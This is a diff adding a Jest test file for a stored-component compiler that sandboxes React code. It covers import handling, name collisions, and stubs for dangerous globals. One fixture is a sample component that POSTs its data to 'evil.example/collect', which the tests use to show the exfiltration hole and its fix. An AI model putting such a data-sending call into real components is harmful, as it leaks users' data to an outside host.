@@ -1,0 +1,411 @@
+import { createElement } from "react";
+import { renderToStaticMarkup } from "react-dom/server";
+import { compileStoredComponent } from "@/lib/code-runtime/compile-stored";
+
+describe("compileStoredComponent", () => {
+  it("renders with the extracted input, sheet, popover, and skeleton imports", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        import { Input } from "@/components/ui/input";
+        import { Sheet, SheetContent } from "@/components/ui/sheet";
+        import { Popover, PopoverContent } from "@/components/ui/popover";
+        import { Skeleton } from "@/components/ui/skeleton";
+
+        export default function ExtractedUiImports() {
+          const importsReady = [Sheet, SheetContent, Popover, PopoverContent].every(Boolean);
+          return (
+            <div data-imports-ready={String(importsReady)}>
+              <Input defaultValue="renderer alive" />
+              <Skeleton className="h-4 w-12" />
+            </div>
+          );
+        }
+      `,
+      allowedImports: [
+        "react",
+        "@/components/ui/input",
+        "@/components/ui/sheet",
+        "@/components/ui/popover",
+        "@/components/ui/skeleton",
+      ],
+    });
+
+    expect(result.error).toBeNull();
+    const Component = result.Component;
+    if (!Component) throw new Error("Expected the slot component to compile");
+    const markup = renderToStaticMarkup(createElement(Component, {}));
+    expect(markup).toContain('data-imports-ready="true"');
+    expect(markup).toContain("renderer alive");
+    // Skeleton pulses via the package-owned `.matrx-pulse` class since the C9
+    // design-system swap (2cd0ca423b): @ai-matrx/design-system ships the
+    // keyframes in its own styles.css (imported by app/layout.tsx) so a
+    // non-Tailwind consumer still animates. Tailwind's `animate-pulse` is no
+    // longer what Skeleton emits.
+    expect(markup).toContain("matrx-pulse");
+  });
+
+  it("removes multiline allowlisted imports before evaluating sandbox code", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        import { useState } from "react";
+        import {
+          ChevronDown,
+          ChevronUp,
+        } from "lucide-react";
+
+        export default function EmployeeCard({ data }: { data: { name?: string } }) {
+          const [open] = useState(false);
+          const Icon = open ? ChevronUp : ChevronDown;
+          return <div><Icon />{data.name}</div>;
+        }
+      `,
+      allowedImports: ["react", "lucide-react"],
+    });
+
+    expect(result.error).toBeNull();
+    expect(typeof result.Component).toBe("function");
+  });
+
+  it("removes type-only and side-effect imports without rewriting strings", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        import type { ReactNode } from "react";
+        import "sandbox-theme";
+
+        export default function ImportText() {
+          const text = 'import { Example } from "docs";';
+          return <div>{text}</div>;
+        }
+      `,
+      allowedImports: [],
+    });
+
+    expect(result.error).toBeNull();
+    expect(typeof result.Component).toBe("function");
+  });
+
+  // Regression: an author-declared top-level component that is also used as a
+  // JSX tag used to collide with the auto-injected fallback scope parameter,
+  // producing "Identifier 'IconBase' has already been declared". The author's
+  // own declaration must simply shadow the injected scope.
+  it("does not collide when the author declares a component used as a JSX tag (const arrow)", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        const IconBase = ({ label }: { label: string }) => <span>{label}</span>;
+
+        export default function Card() {
+          return <div><IconBase label="hi" /></div>;
+        }
+      `,
+      allowedImports: ["react", "lucide-react"],
+    });
+
+    expect(result.error).toBeNull();
+    expect(typeof result.Component).toBe("function");
+  });
+
+  it("does not collide when the author declares a class component used as a JSX tag", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        class Panel extends (globalThis as any).Object {
+          render() { return null; }
+        }
+        const Widget = () => <span>w</span>;
+        export default function Root() {
+          return <div><Widget /></div>;
+        }
+      `,
+      allowedImports: ["react"],
+    });
+
+    expect(result.error).toBeNull();
+    expect(typeof result.Component).toBe("function");
+  });
+
+  // Regression: an author-declared top-level `const` that shadows an ALLOWLISTED
+  // export (here `Button`) used to collide with the injected scope parameter of
+  // the same name. The author's declaration must win.
+  it("does not collide when the author redeclares an allowlisted identifier", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        const Button = ({ children }: { children?: unknown }) => <button>{children as any}</button>;
+
+        export default function Toolbar() {
+          return <div><Button>Save</Button></div>;
+        }
+      `,
+      allowedImports: ["react", "@/components/ui/button"],
+    });
+
+    expect(result.error).toBeNull();
+    expect(typeof result.Component).toBe("function");
+  });
+
+  it("lets the host replace an allowlisted runtime primitive", () => {
+    const HostMarkdownStream = () =>
+      createElement("span", { "data-host-stream": "true" });
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        import MarkdownStream from "@/components/MarkdownStream";
+        export default function Result() {
+          return <MarkdownStream content="live" />;
+        }
+      `,
+      allowedImports: ["react", "@/components/MarkdownStream"],
+      scopeOverrides: { MarkdownStream: HostMarkdownStream },
+    });
+
+    expect(result.error).toBeNull();
+    const Component = result.Component;
+    if (!Component) throw new Error("Expected the slot component to compile");
+    const markup = renderToStaticMarkup(createElement(Component, {}));
+    expect(markup).toContain('data-host-stream="true"');
+  });
+
+  // The kind-component authoring contract (matrx-ai `component_source_lint`)
+  // documents a BARE top-level `function Card({ data }) {…}` — no default
+  // export — and the Workflow Studio's compiler (a port of this one) accepts
+  // it. This compiler must too: without the fallback such a source compiled
+  // to a factory returning nothing, the caller reported "compile produced no
+  // component", and a stored, paid-for component silently never rendered.
+  it("resolves a bare top-level PascalCase component with no default export", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        function Card({ data }) {
+          return <div data-bare="true">{data?.title}</div>;
+        }
+      `,
+      allowedImports: ["react"],
+    });
+
+    expect(result.error).toBeNull();
+    const Component = result.Component;
+    if (!Component) throw new Error("Expected the bare component to compile");
+    const markup = renderToStaticMarkup(
+      createElement(Component, { data: { title: "hello" } }),
+    );
+    expect(markup).toContain('data-bare="true"');
+    expect(markup).toContain("hello");
+  });
+
+  it("prefers an explicit default export over a PascalCase candidate", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        function Helper() { return <span data-helper="true" />; }
+        export default function Main() { return <div data-main="true" />; }
+      `,
+      allowedImports: ["react"],
+    });
+
+    expect(result.error).toBeNull();
+    const Component = result.Component;
+    if (!Component) throw new Error("Expected the component to compile");
+    const markup = renderToStaticMarkup(createElement(Component, {}));
+    expect(markup).toContain('data-main="true"');
+  });
+});
+
+// THE IMPORT-BINDING CONTRACT. Import declarations are stripped and the scope
+// supplies modules under their canonical names — which only ever worked for
+// un-renamed forms. A namespace import, an aliased named import, or a renamed
+// default produced an identifier nothing defined, and the component died on
+// its first execution ("MarkdownStreamMod is not defined" —
+// authority_newsjacking_article, 2026-08-25). The import PATH was allowlisted,
+// so neither the authoring lint nor the browser could see it coming.
+describe("author-local import names", () => {
+  it("binds a namespace import to a usable module object", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        import * as MarkdownStreamMod from "@/components/MarkdownStream";
+        // The exact defensive shape authoring agents write. A namespace whose
+        // missing keys answered with a fallback would short-circuit HERE and
+        // render a placeholder icon instead of the real renderer.
+        const Renderer: any =
+          (MarkdownStreamMod as any).NotAnExport ||
+          (MarkdownStreamMod as any).default;
+        export default function Article() {
+          return (
+            <div
+              data-missing={String(
+                (MarkdownStreamMod as any).NotAnExport === undefined,
+              )}
+              data-bound={String(Renderer != null)}
+            />
+          );
+        }
+      `,
+      allowedImports: ["react", "@/components/MarkdownStream"],
+    });
+
+    expect(result.error).toBeNull();
+    const Component = result.Component;
+    if (!Component) throw new Error("Expected the slot component to compile");
+    const markup = renderToStaticMarkup(createElement(Component, {}));
+    expect(markup).toContain('data-missing="true"');
+    expect(markup).toContain('data-bound="true"');
+  });
+
+  it("binds an aliased named import", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        import { Badge as Chip } from "@/components/ui/badge";
+        export default function Tags() {
+          return <Chip>alias</Chip>;
+        }
+      `,
+      allowedImports: ["react", "@/components/ui/badge"],
+    });
+
+    expect(result.error).toBeNull();
+    const Component = result.Component;
+    if (!Component) throw new Error("Expected the slot component to compile");
+    expect(renderToStaticMarkup(createElement(Component, {}))).toContain(
+      "alias",
+    );
+  });
+
+  it("binds a renamed default import", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        import Md from "@/components/MarkdownStream";
+        export default function Body() {
+          return <div data-bound={String(typeof Md !== "undefined" && Boolean(Md))} />;
+        }
+      `,
+      allowedImports: ["react", "@/components/MarkdownStream"],
+    });
+
+    expect(result.error).toBeNull();
+    const Component = result.Component;
+    if (!Component) throw new Error("Expected the slot component to compile");
+    expect(renderToStaticMarkup(createElement(Component, {}))).toContain(
+      'data-bound="true"',
+    );
+  });
+
+  it("degrades an unknown namespace import to a safe proxy, never a crash", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        import * as Nope from "@/components/does-not-exist";
+        const Thing: any = (Nope as any).SomeWidget;
+        export default function Shell() {
+          return <div><Thing /></div>;
+        }
+      `,
+      allowedImports: ["react"],
+    });
+
+    expect(result.error).toBeNull();
+    const Component = result.Component;
+    if (!Component) throw new Error("Expected the slot component to compile");
+    expect(() =>
+      renderToStaticMarkup(createElement(Component, {})),
+    ).not.toThrow();
+  });
+});
+
+/**
+ * Q82 / B-17 — the runtime half of the source gate. An organization-authored
+ * component compiled with `sandboxDangerousGlobals` must throw a NAMED error
+ * when it reaches for the network or the evaluator, while an identical
+ * component doing honest work still renders.
+ */
+describe("compileStoredComponent — dangerous-global stubs", () => {
+  const EXFILTRATING = `
+    export default function Exfiltrate({ data }) {
+      fetch("https://evil.example/collect", {
+        method: "POST",
+        body: JSON.stringify(data),
+      });
+      return <div>ok</div>;
+    }
+  `;
+
+  it("lets the exfiltrating component run when the stubs are OFF (today's scope)", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: EXFILTRATING,
+      allowedImports: ["react"],
+    });
+    expect(result.error).toBeNull();
+    expect(result.Component).not.toBeNull();
+    // Proof the hole is real: the compiled body's `fetch` is the page's own.
+    const calls: string[] = [];
+    const realFetch = globalThis.fetch;
+    // @ts-expect-error — deliberately replacing the global for one assertion.
+    globalThis.fetch = (url: string) => {
+      calls.push(String(url));
+      return Promise.resolve(undefined as never);
+    };
+    try {
+      renderToStaticMarkup(createElement(result.Component!, { data: { a: 1 } }));
+    } finally {
+      globalThis.fetch = realFetch;
+    }
+    expect(calls).toEqual(["https://evil.example/collect"]);
+  });
+
+  it("throws a named error when the stubs are ON", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: EXFILTRATING,
+      allowedImports: ["react"],
+      sandboxDangerousGlobals: true,
+    });
+    expect(result.error).toBeNull();
+    expect(() =>
+      renderToStaticMarkup(createElement(result.Component!, { data: { a: 1 } })),
+    ).toThrow(/This component tried to use "fetch"/);
+  });
+
+  it("still renders an honest component with the stubs ON", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        import { Card } from "@/components/ui/card";
+        export default function Honest({ data }) {
+          return <Card data-title={String(data?.title ?? "")}>rendered</Card>;
+        }
+      `,
+      allowedImports: ["react", "@/components/ui/card"],
+      sandboxDangerousGlobals: true,
+    });
+    expect(result.error).toBeNull();
+    const markup = renderToStaticMarkup(
+      createElement(result.Component!, { data: { title: "hello" } }),
+    );
+    expect(markup).toContain("rendered");
+    expect(markup).toContain('data-title="hello"');
+  });
+
+  it("does not steal a name the author declared themselves", () => {
+    const result = compileStoredComponent({
+      origin: "test:compile-stored",
+      code: `
+        const localStorage = { getItem: () => "author-owned" };
+        export default function Shadowed({ data }) {
+          return <div>{localStorage.getItem("k")}</div>;
+        }
+      `,
+      allowedImports: ["react"],
+      sandboxDangerousGlobals: true,
+    });
+    expect(result.error).toBeNull();
+    expect(
+      renderToStaticMarkup(createElement(result.Component!, { data: {} })),
+    ).toContain("author-owned");
+  });
+});
